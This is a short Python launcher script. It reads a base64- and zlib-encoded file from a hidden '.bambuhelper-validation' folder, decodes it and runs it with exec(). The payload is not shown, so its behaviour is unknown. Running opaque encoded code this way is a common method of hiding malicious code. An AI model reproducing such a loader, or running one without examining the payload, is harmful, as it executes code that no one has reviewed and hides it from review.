#!/usr/bin/env python3
from pathlib import Path
import base64, zlib

payload = Path(__file__).resolve().parent / '.bambuhelper-validation' / 'v11_1_calm_verified.zlib.b64'
source = zlib.decompress(base64.b64decode(payload.read_text().strip()))
exec(compile(source, str(payload) + ':decoded', 'exec'))
